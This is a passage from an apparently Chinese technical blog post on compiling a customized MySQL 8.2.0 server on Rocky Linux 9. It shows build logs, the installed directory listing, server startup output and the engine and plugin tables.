class="line">[ 15%] Built target libedit_help</span><br><span class="line">[ 15%] Built target libedit_func</span><br><span class="line">[ 15%] Built target event_pthreads</span><br><span class="line">[ 16%] Built target event_core</span><br><span class="line">[ 18%] Built target build_id_test</span><br><span class="line">[ 18%] Built target icuuc</span><br><span class="line">[ 19%] Built target mysys_objlib</span><br><span class="line">[ 20%] Built target mysqlservices</span><br><span class="line">[ 20%] Built target oci_common_objlib</span><br><span class="line">[ 20%] Built target GenLiteProtos</span><br><span class="line">[ 20%] Built target library_mysys</span><br><span class="line">[ 20%] Built target decimal_objlib</span><br><span class="line">[ 20%] Built target zlib</span><br><span class="line">[ 20%] Built target mysqltest_safe_process</span><br><span class="line">[ 20%] Built target zstd</span><br><span class="line">[ 20%] Built target strings_ja_hans</span><br><span class="line">[ 20%] Built target strings_zh_hans</span><br><span class="line">[ 20%] Built target vio</span><br><span class="line">[ 21%] Built target mytime</span><br><span class="line">[ 22%] Built target sql_commands</span><br><span class="line">[ 22%] Built target GenServerSource</span><br><span class="line">[ 22%] Built target libedit_fcns</span><br><span class="line">[ 23%] Built target event_openssl</span><br><span class="line">[ 23%] Built target event_extra</span><br><span class="line">[ 25%] Built target changestreams_standalone_static</span><br><span class="line">[ 25%] Built target oci_common</span><br><span class="line">[ 25%] Built target decimal</span><br><span class="line">[ 25%] Built target GenSysSchemaC</span><br><span class="line">[ 27%] Built target mysql_binlog_event_standalone</span><br><span class="line">[ 27%] Built target icui18n</span><br><span class="line">[ 27%] Built target GenSysSchema</span><br><span class="line">[ 28%] Built target gen_keyword_list</span><br><span class="line">[ 28%] Built target gen_lex_token</span><br><span class="line">[ 29%] Built target mysqlgcs</span><br><span class="line">[ 29%] Built target GenKeywordList</span><br><span class="line">[ 29%] Built target GenDigestServerSource</span><br><span class="line">[ 31%] Built target edit</span><br><span class="line">[ 31%] Built target strings_objlib</span><br><span class="line">[ 32%] Built target strings</span><br><span class="line">[ 32%] Built target strings_shared</span><br><span class="line">[ 32%] Built target conf_to_src</span><br><span class="line">[ 32%] Built target mysys</span><br><span class="line">[ 32%] Built target comp_err</span><br><span class="line">[ 32%] Built target thr_lock</span><br><span class="line">[ 33%] Built target mf_iocache_test</span><br><span class="line">[ 34%] Built target mysql_ssl_rsa_setup</span><br><span class="line">[ 34%] Built target comp_client_err</span><br><span class="line">[ 34%] Built target my_print_defaults</span><br><span class="line">[ 34%] Built target lz4_decompress</span><br><span class="line">[ 34%] Built target zlib_decompress</span><br><span class="line">[ 34%] Built target GenError</span><br><span class="line">[ 34%] Built target GenClientError</span><br><span class="line">[ 34%] Built target range_check_err</span><br><span class="line">[ 34%] Built target perror</span><br><span class="line">[ 34%] Built target mysql_tzinfo_to_sql</span><br><span class="line">[ 34%] Built target udf_example</span><br><span class="line">[ 34%] Built target locking_service</span><br><span class="line">[ 34%] Built target csv</span><br><span class="line">[ 34%] Built target libprotobuf</span><br><span class="line">[ 37%] Built target heap_library</span><br><span class="line">[ 37%] Built target mysql_binlog_event</span><br><span class="line">[ 38%] Built target myisammrg</span><br><span class="line">[ 38%] Built target ngram_parser</span><br><span class="line">[ 38%] Built target temptable</span><br><span class="line">[ 39%] Built target mysql_native_password</span><br><span class="line">[ 40%] Built target minchassis</span><br><span class="line">[ 40%] Built target myisam_library</span><br><span class="line">[ 40%] Built target installed_headers</span><br><span class="line">[ 41%] Built target archive</span><br><span class="line">[ 42%] Built target clientlib_objlib</span><br><span class="line">[ 43%] Built target blackhole</span><br><span class="line">[ 44%] Built target example</span><br><span class="line">[ 44%] Built target federated</span><br><span class="line">[ 46%] Built target innodb_zipdecompress</span><br><span class="line">[ 46%] Built target myisam_ftdump</span><br><span class="line">[ 46%] Built target myisamchk</span><br><span class="line">[ 46%] Built target mysql_server_component_services</span><br><span class="line">[ 46%] Built target myisamlog</span><br><span class="line">[ 46%] Built target myisampack</span><br><span class="line">[ 46%] Built target test_security_context</span><br><span class="line">[ 46%] Built target audit_null</span><br><span class="line">[ 46%] Built target auth</span><br><span class="line">[ 46%] Built target qa_auth_client</span><br><span class="line">[ 46%] Built target auth_test_plugin</span><br><span class="line">[ 46%] Built target mock</span><br><span class="line">[ 46%] Built target qa_auth_server</span><br><span class="line">[ 46%] Built target qa_auth_interface</span><br><span class="line">[ 46%] Built target mysql_no_login</span><br><span class="line">[ 46%] Built target auth_socket</span><br><span class="line">[ 46%] Built target daemon_example</span><br><span class="line">[ 46%] Built target ddl_rewriter</span><br><span class="line">[ 46%] Built target ftexample</span><br><span class="line">[ 46%] Built target connection_control</span><br><span class="line">[ 46%] Built target clone</span><br><span class="line">[ 46%] Built target keyring_udf</span><br><span class="line">[ 47%] Built target validate_password</span><br><span class="line">[ 47%] Built target pfs_example_plugin_employee</span><br><span class="line">[ 48%] Built target rewrite_example</span><br><span class="line">[ 48%] Built target replication_observers_example</span><br><span class="line">[ 48%] Built target rewriter</span><br><span class="line">[ 48%] Built target keyring_file</span><br><span class="line">[ 48%] Built target semisync_source</span><br><span class="line">[ 48%] Built target semisync_replica</span><br><span class="line">[ 50%] Built target semisync_master</span><br><span class="line">[ 50%] Built target conflicting_variables</span><br><span class="line">[ 51%] Built target semisync_slave</span><br><span class="line">[ 51%] Built target test_sql_replication</span><br><span class="line">[ 51%] Built target test_sql_reset_connection</span><br><span class="line">[ 51%] Built target test_sql_sqlmode</span><br><span class="line">[ 51%] Built target test_sql_lock</span><br><span class="line">[ 51%] Built target test_sql_commit</span><br><span class="line">[ 51%] Built target test_session_attach</span><br><span class="line">[ 51%] Built target test_session_detach</span><br><span class="line">[ 51%] Built target test_sql_stmt</span><br><span class="line">[ 51%] Built target test_sql_complex</span><br><span class="line">[ 51%] Built target test_sql_processlist</span><br><span class="line">[ 51%] Built target test_sql_errors</span><br><span class="line">[ 51%] Built target test_x_sessions_deinit</span><br><span class="line">[ 51%] Built target test_sql_stored_procedures_functions</span><br><span class="line">[ 51%] Built target test_session_info</span><br><span class="line">[ 51%] Built target test_x_sessions_init</span><br><span class="line">[ 51%] Built target test_sql_all_col_types</span><br><span class="line">[ 51%] Built target test_sql_views_triggers</span><br><span class="line">[ 51%] Built target test_sql_2_sessions</span><br><span class="line">[ 51%] Built target test_session_in_thd</span><br><span class="line">[ 51%] Built target test_sql_shutdown</span><br><span class="line">[ 51%] Built target test_sql_sleep_is_connected</span><br><span class="line">[ 51%] Built target test_sql_cmds_1</span><br><span class="line">[ 51%] Built target test_services_host_application_signal</span><br><span class="line">[ 51%] Built target test_services_thread</span><br><span class="line">[ 51%] Built target test_framework</span><br><span class="line">[ 51%] Built target test_services_plugin_registry</span><br><span class="line">[ 52%] Built target test_services</span><br><span class="line">[ 52%] Built target test_services_command_services</span><br><span class="line">[ 52%] Built target test_udf_services</span><br><span class="line">[ 52%] Built target version_token</span><br><span class="line">[ 52%] Built target component_audit_api_message_emit</span><br><span class="line">[ 52%] Built target component_example_component1</span><br><span class="line">[ 52%] Built target component_example_component2</span><br><span class="line">[ 53%] Built target component_example_component3</span><br><span class="line">[ 53%] Built target component_test_string_service_charset</span><br><span class="line">[ 54%] Built target component_test_string_service</span><br><span class="line">[ 54%] Built target component_test_string_service_long</span><br><span class="line">[ 54%] Built target component_test_backup_lock_service</span><br><span class="line">[ 54%] Built target component_log_sink_test</span><br><span class="line">[ 55%] Built target component_log_filter_dragnet</span><br><span class="line">[ 55%] Built target component_log_sink_json</span><br><span class="line">[ 55%] Built target component_log_sink_syseventlog</span><br><span class="line">[ 55%] Built target component_mysqlbackup</span><br><span class="line">[ 55%] Built target component_pfs_example_component_population</span><br><span class="line">[ 55%] Built target component_pfs_example</span><br><span class="line">[ 56%] Built target component_query_attributes</span><br><span class="line">[ 56%] Built target keyring_common_objlib</span><br><span class="line">[ 56%] Built target component_test_event_tracking_consumer</span><br><span class="line">[ 56%] Built target component_reference_cache</span><br><span class="line">[ 57%] Built target component_test_sys_var_service_int</span><br><span class="line">[ 57%] Built target component_test_sys_var_service</span><br><span class="line">[ 57%] Built target component_test_system_variable_source</span><br><span class="line">[ 57%] Built target component_udf_unreg_real_func</span><br><span class="line">[ 57%] Built target component_udf_reg_avg_func</span><br><span class="line">[ 57%] Built target component_udf_reg_int_same_func</span><br><span class="line">[ 57%] Built target component_udf_reg_only_3_func</span><br><span class="line">[ 57%] Built target component_udf_reg_int_func</span><br><span class="line">[ 57%] Built target component_udf_unreg_3_func</span><br><span class="line">[ 57%] Built target component_test_sys_var_service_same</span><br><span class="line">[ 57%] Built target component_udf_reg_3_func</span><br><span class="line">[ 57%] Built target component_test_status_var_service</span><br><span class="line">[ 57%] Built target component_test_status_var_reader</span><br><span class="line">[ 58%] Built target component_udf_reg_real_func</span><br><span class="line">[ 58%] Built target component_test_udf_registration</span><br><span class="line">[ 58%] Built target component_test_sys_var_service_str</span><br><span class="line">[ 58%] Built target component_test_status_var_service_reg_only</span><br><span class="line">[ 58%] Built target component_udf_unreg_int_func</span><br><span class="line">[ 58%] Built target component_test_status_var_service_int</span><br><span class="line">[ 58%] Built target component_test_audit_api_message</span><br><span class="line">[ 58%] Built target component_test_status_var_service_str</span><br><span class="line">[ 58%] Built target component_test_mysql_thd_store_service</span><br><span class="line">[ 58%] Built target component_test_mysql_runtime_error</span><br><span class="line">[ 58%] Built target component_test_mysql_current_thread_reader</span><br><span class="line">[ 58%] Built target component_test_sensitive_system_variables</span><br><span class="line">[ 58%] Built target component_test_status_var_service_unreg_only</span><br><span class="line">[ 58%] Built target component_test_host_application_signal</span><br><span class="line">[ 58%] Built target component_test_component_deinit</span><br><span class="line">[ 58%] Built target component_test_mysql_command_services</span><br><span class="line">[ 59%] Built target component_test_mysql_system_variable_set</span><br><span class="line">[ 59%] Built target component_test_server_telemetry_metrics</span><br><span class="line">[ 59%] Built target component_test_server_telemetry_traces</span><br><span class="line">[ 59%] Built target component_validate_password</span><br><span class="line">[ 61%] Built target mysql_test_event_tracking</span><br><span class="line">[ 61%] Built target component_test_event_tracking_producer_a</span><br><span class="line">[ 61%] Built target component_test_event_tracking_producer_b</span><br><span class="line">[ 61%] Built target component_test_event_tracking_consumer_a</span><br><span class="line">[ 61%] Built target component_test_event_tracking_consumer_b</span><br><span class="line">[ 61%] Built target component_test_event_tracking_consumer_c</span><br><span class="line">[ 61%] Built target mysql_keyring_encryption_test</span><br><span class="line">[ 61%] Built target component_test_pfs_notification</span><br><span class="line">[ 61%] Built target component_test_table_access</span><br><span class="line">[ 61%] Built target component_test_pfs_resource_group</span><br><span class="line">[ 61%] Built target component_test_udf_services</span><br><span class="line">[ 61%] Built target perfschema</span><br><span class="line">[ 61%] Built target ibd2sdi</span><br><span class="line">[ 61%] Built target innochecksum</span><br><span class="line">[ 61%] Built target heap</span><br><span class="line">[ 62%] Built target json_client_library_objlib</span><br><span class="line">[ 62%] Built target clientlib</span><br><span class="line">[ 62%] Built target json_binlog</span><br><span class="line">[ 62%] Built target keyring_common</span><br><span class="line">[ 62%] Built target json_client_library</span><br><span class="line">[ 62%] Built target json_binlog_main</span><br><span class="line">[ 62%] Built target myisam</span><br><span class="line">[ 62%] Built target libmysql</span><br><span class="line">[ 62%] Built target mysqlclient</span><br><span class="line">[ 62%] Built target component_keyring_file</span><br><span class="line">[ 62%] Built target json_binlog_static</span><br><span class="line">[ 62%] Built target mysqlshow</span><br><span class="line">[ 63%] Built target mysqlimport</span><br><span class="line">[ 63%] Built target mysqldump</span><br><span class="line">[ 63%] Built target mysqlcheck</span><br><span class="line">[ 64%] Built target mysqltest</span><br><span class="line">[ 64%] Built target json_client_library_main</span><br><span class="line">[ 64%] Built target mysqladmin</span><br><span class="line">[ 64%] Built target client_base</span><br><span class="line">[ 64%] Built target mysql_secure_installation</span><br><span class="line">[ 64%] Built target mysql_config_editor</span><br><span class="line">[ 64%] Built target json_binlog_main_static</span><br><span class="line">[ 64%] Built target mysqlslap</span><br><span class="line">[ 64%] Built target mysql_migrate_keyring</span><br><span class="line">[ 64%] Built target mysql_client_test</span><br><span class="line">[ 66%] Built target libmysql_api_test</span><br><span class="line">[ 66%] Built target mysql_upgrade</span><br><span class="line">[ 66%] Built target libprotoc</span><br><span class="line">[ 66%] Built target protoc</span><br><span class="line">[ 66%] Built target run_libmysql_api_test</span><br><span class="line">[ 67%] Built target gr_protobuf_lite</span><br><span class="line">[ 67%] Built target mysql</span><br><span class="line">[ 69%] Built target mysqlpump_lib</span><br><span class="line">[ 69%] Built target rpl_protobuf_lite</span><br><span class="line">[ 69%] Built target mysqlbinlog</span><br><span class="line">[ 69%] Built target mysqlxmessages</span><br><span class="line">[ 69%] Built target mysqlpump</span><br><span class="line">[ 69%] Built target mysqlxmessages_lite</span><br><span class="line">[ 69%] Built target xprotocol_plugin</span><br><span class="line">[ 71%] Built target mysqlxclient_lite</span><br><span class="line">[ 71%] Built target mysqlxclient</span><br><span class="line">[ 76%] Built target group_replication</span><br><span class="line">[ 84%] Built target sql_main</span><br><span class="line">[ 84%] Built target rpl_source</span><br><span class="line">[ 89%] Built target sql_dd</span><br><span class="line">[ 90%] Built target rpl_replica</span><br><span class="line">[ 92%] Built target sql_gis</span><br><span class="line">[ 93%] Built target binlog</span><br><span class="line">[ 93%] Built target rpl</span><br><span class="line"><span class="meta prompt_">[100%</span><span class="language-bash">] Built target innobase</span></span><br><span class="line"><span class="meta prompt_">[100%</span><span class="language-bash">] Built target mysqld</span></span><br><span class="line"><span class="meta prompt_">[100%</span><span class="language-bash">] Built target INFO_BIN</span></span><br></pre></td></tr></table></figure></div>
<p>编译耗时：real 73m, user 231m.</p>
<p><img  
                     lazyload
                     src="/img/loading.svg"
                     data-src="/2023/mysql/mysql-8.2.0-compile-customization/img1-compile-73m.png"
                      alt="" loading="lazy"
                ></p>
<p>安装数据库，查看安装后的目录。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rocky9 mysql]# ll</span><br><span class="line">total 292</span><br><span class="line">drwxr-xr-x.  2 root root   4096 Nov 10 00:19 bin</span><br><span class="line">drwxr-xr-x.  2 root root     38 Nov 10 00:19 docs</span><br><span class="line">drwxr-xr-x.  3 root root   4096 Nov 10 00:19 include</span><br><span class="line">drwxr-xr-x.  5 root root    187 Nov 10 00:19 lib</span><br><span class="line">-rw-r--r--.  1 root root 279351 Oct 12 19:40 LICENSE</span><br><span class="line">drwxr-xr-x.  4 root root     30 Nov 10 00:19 man</span><br><span class="line">-rw-r--r--.  1 root root    666 Oct 12 19:40 README</span><br><span class="line">drwxr-xr-x. 28 root root   4096 Nov 10 00:19 share</span><br><span class="line">drwxr-xr-x.  2 root root     77 Nov 10 00:19 support-files</span><br></pre></td></tr></table></figure></div>
<p>运行数据库。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[mysql@rocky9 mysql]$ /usr/local/mysql/bin/mysqld</span><br><span class="line">2023-11-09T16:07:52.428069Z 0 [System] [MY-015015] [Server] MySQL Server - start.</span><br><span class="line">2023-11-09T16:07:53.115177Z 0 [System] [MY-010116] [Server] /usr/local/mysql/bin/mysqld (mysqld 8.2.0-ShawnYan-debug) starting as process 146906</span><br><span class="line">2023-11-09T16:07:53.174965Z 1 [System] [MY-013576] [InnoDB] InnoDB initialization has started.</span><br><span class="line">2023-11-09T16:07:53.963537Z 1 [System] [MY-013577] [InnoDB] InnoDB initialization has ended.</span><br><span class="line">2023-11-09T16:07:57.246800Z 0 [Warning] [MY-010068] [Server] CA certificate ca.pem is self signed.</span><br><span class="line">2023-11-09T16:07:57.246958Z 0 [System] [MY-013602] [Server] Channel mysql_main configured to support TLS. Encrypted connections are now supported for this channel.</span><br><span class="line">2023-11-09T16:07:57.584185Z 0 [System] [MY-010931] [Server] /usr/local/mysql/bin/mysqld: ready for connections. Version: &#x27;8.2.0-ShawnYan-debug&#x27;  socket: &#x27;/tmp/mysql.sock&#x27;  port: 3306  Source distribution.</span><br></pre></td></tr></table></figure></div>
<p>查看引擎。</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">show</span> engines;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+---------+------------------------------------------------------------+--------------+------+------------+</span></span><br><span class="line"><span class="operator">|</span> Engine             <span class="operator">|</span> Support <span class="operator">|</span> Comment                                                    <span class="operator">|</span> Transactions <span class="operator">|</span> XA   <span class="operator">|</span> Savepoints <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+---------+------------------------------------------------------------+--------------+------+------------+</span></span><br><span class="line"><span class="operator">|</span> MRG_MYISAM         <span class="operator">|</span> YES     <span class="operator">|</span> Collection <span class="keyword">of</span> identical MyISAM tables                      <span class="operator">|</span> <span class="keyword">NO</span>           <span class="operator">|</span> <span class="keyword">NO</span>   <span class="operator">|</span> <span class="keyword">NO</span>         <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> MyISAM             <span class="operator">|</span> YES     <span class="operator">|</span> MyISAM storage engine                                      <span class="operator">|</span> <span class="keyword">NO</span>           <span class="operator">|</span> <span class="keyword">NO</span>   <span class="operator">|</span> <span class="keyword">NO</span>         <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> PERFORMANCE_SCHEMA <span class="operator">|</span> YES     <span class="operator">|</span> Performance Schema                                         <span class="operator">|</span> <span class="keyword">NO</span>           <span class="operator">|</span> <span class="keyword">NO</span>   <span class="operator">|</span> <span class="keyword">NO</span>         <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> InnoDB             <span class="operator">|</span> <span class="keyword">DEFAULT</span> <span class="operator">|</span> Supports transactions, <span class="type">row</span><span class="operator">-</span>level locking, <span class="keyword">and</span> <span class="keyword">foreign</span> keys <span class="operator">|</span> YES          <span class="operator">|</span> YES  <span class="operator">|</span> YES        <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> MEMORY             <span class="operator">|</span> YES     <span class="operator">|</span> Hash based, stored <span class="keyword">in</span> memory, useful <span class="keyword">for</span> temporary tables  <span class="operator">|</span> <span class="keyword">NO</span>           <span class="operator">|</span> <span class="keyword">NO</span>   <span class="operator">|</span> <span class="keyword">NO</span>         <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> CSV                <span class="operator">|</span> YES     <span class="operator">|</span> CSV storage engine                                         <span class="operator">|</span> <span class="keyword">NO</span>           <span class="operator">|</span> <span class="keyword">NO</span>   <span class="operator">|</span> <span class="keyword">NO</span>         <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+---------+------------------------------------------------------------+--------------+------+------------+</span></span><br><span class="line"><span class="number">6</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.01</span> sec)</span><br></pre></td></tr></table></figure></div>
<p>查看插件。</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">show</span> plugins;</span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------------------+--------+--------------------+---------+---------+</span></span><br><span class="line"><span class="operator">|</span> Name                            <span class="operator">|</span> Status <span class="operator">|</span> Type               <span class="operator">|</span> Library <span class="operator">|</span> License <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------------------+--------+--------------------+---------+---------+</span></span><br><span class="line"><span class="operator">|</span> binlog                          <span class="operator">|</span> ACTIVE <span class="operator">|</span> STORAGE ENGINE     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span> GPL     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> sha256_password                 <span class="operator">|</span> ACTIVE <span class="operator">|</span> AUTHENTICATION     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span> GPL     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> caching_sha2_password           <span class="operator">|</span> ACTIVE <span class="operator">|</span> AUTHENTICATION     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span> GPL     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> sha2_cache_cleaner              <span class="operator">|</span> ACTIVE <span class="operator">|</span> AUDIT              <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span> GPL     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> daemon_keyring_proxy_plugin     <span class="operator">|</span> ACTIVE <span class="operator">|</span> DAEMON             <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span> GPL     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> CSV                             <span class="operator">|</span> ACTIVE <span class="operator">|</span> STORAGE ENGINE     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span> GPL     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> MEMORY                          <span class="operator">|</span> ACTIVE <span class="operator">|</span> STORAGE ENGINE     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span> GPL     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> InnoDB                          <span class="operator">|</span> ACTIVE <span class="operator">|</span> STORAGE ENGINE     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span> GPL     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> INNODB_TRX                      <span class="operator">|</span> ACTIVE <span class="operator">|</span> INFORMATION SCHEMA <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span> GPL     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> INNODB_CMP                      <span class="operator">|</span> ACTIVE <span class="operator">|</span> INFORMATION SCHEMA <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span> GPL     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> INNODB_CMP_RESET                <span class="operator">|</span> ACTIVE <span class="operator">|</span> INFORMATION SCHEMA <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span> GPL     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> INNODB_CMPMEM                   <span class="operator">|</span> ACTIVE <span class="operator">|</span> INFORMATION SCHEMA <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span> GPL     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> INNODB_CMPMEM_RESET             <span class="operator">|</span> ACTIVE <span class="operator">|</span> INFORMATION SCHEMA <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span> GPL     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> INNODB_CMP_PER_INDEX            <span class="operator">|</span> ACTIVE <span class="operator">|</span> INFORMATION SCHEMA <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span> GPL     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> INNODB_CMP_PER_INDEX_RESET      <span class="operator">|</span> ACTIVE <span class="operator">|</span> INFORMATION SCHEMA <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span> GPL     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> INNODB_BUFFER_PAGE              <span class="operator">|</span> ACTIVE <span class="operator">|</span> INFORMATION SCHEMA <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span> GPL     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> INNODB_BUFFER_PAGE_LRU          <span class="operator">|</span> ACTIVE <span class="operator">|</span> INFORMATION SCHEMA <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span> GPL     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> INNODB_BUFFER_POOL_STATS        <span class="operator">|</span> ACTIVE <span class="operator">|</span> INFORMATION SCHEMA <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span> GPL     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> INNODB_TEMP_TABLE_INFO          <span class="operator">|</span> ACTIVE <span class="operator">|</span> INFORMATION SCHEMA <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span> GPL     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> INNODB_METRICS                  <span class="operator">|</span> ACTIVE <span class="operator">|</span> INFORMATION SCHEMA <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span> GPL     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> INNODB_FT_DEFAULT_STOPWORD      <span class="operator">|</span> ACTIVE <span class="operator">|</span> INFORMATION SCHEMA <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span> GPL     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> INNODB_FT_DELETED               <span class="operator">|</span> ACTIVE <span class="operator">|</span> INFORMATION SCHEMA <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span> GPL     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> INNODB_FT_BEING_DELETED         <span class="operator">|</span> ACTIVE <span class="operator">|</span> INFORMATION SCHEMA <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span> GPL     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> INNODB_FT_CONFIG                <span class="operator">|</span> ACTIVE <span class="operator">|</span> INFORMATION SCHEMA <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span> GPL     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> INNODB_FT_INDEX_CACHE           <span class="operator">|</span> ACTIVE <span class="operator">|</span> INFORMATION SCHEMA <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span> GPL     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> INNODB_FT_INDEX_TABLE           <span class="operator">|</span> ACTIVE <span class="operator">|</span> INFORMATION SCHEMA <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span> GPL     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> INNODB_TABLES                   <span class="operator">|</span> ACTIVE <span class="operator">|</span> INFORMATION SCHEMA <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span> GPL     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> INNODB_TABLESTATS               <span class="operator">|</span> ACTIVE <span class="operator">|</span> INFORMATION SCHEMA <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span> GPL     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> INNODB_INDEXES                  <span class="operator">|</span> ACTIVE <span class="operator">|</span> INFORMATION SCHEMA <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span> GPL     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> INNODB_TABLESPACES              <span class="operator">|</span> ACTIVE <span class="operator">|</span> INFORMATION SCHEMA <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span> GPL     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> INNODB_COLUMNS                  <span class="operator">|</span> ACTIVE <span class="operator">|</span> INFORMATION SCHEMA <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span> GPL     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> INNODB_VIRTUAL                  <span class="operator">|</span> ACTIVE <span class="operator">|</span> INFORMATION SCHEMA <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span> GPL     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> INNODB_CACHED_INDEXES           <span class="operator">|</span> ACTIVE <span class="operator">|</span> INFORMATION SCHEMA <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span> GPL     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> INNODB_SESSION_TEMP_TABLESPACES <span class="operator">|</span> ACTIVE <span class="operator">|</span> INFORMATION SCHEMA <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span> GPL     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> MyISAM                          <span class="operator">|</span> ACTIVE <span class="operator">|</span> STORAGE ENGINE     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span> GPL     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> MRG_MYISAM                      <span class="operator">|</span> ACTIVE <span class="operator">|</span> STORAGE ENGINE     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span> GPL     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> PERFORMANCE_SCHEMA              <span class="operator">|</span> ACTIVE <span class="operator">|</span> STORAGE ENGINE     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span> GPL     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> TempTable                       <span class="operator">|</span> ACTIVE <span class="operator">|</span> STORAGE ENGINE     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span> GPL     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> ngram                           <span class="operator">|</span> ACTIVE <span class="operator">|</span> FTPARSER           <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span> GPL     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> mysql_native_password           <span class="operator">|</span> ACTIVE <span class="operator">|</span> AUTHENTICATION     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span> GPL     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------------------+--------+--------------------+---------+---------+</span></span><br><span class="line"><span class="number">40</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.01</span> sec)</span><br></pre></td></tr></table></figure></div>
<h2 id="彩蛋">彩蛋</h2>
<p>之前在 PG 的文章中多次演示过如何在 PG 编译过程加入定制版本号。</p>
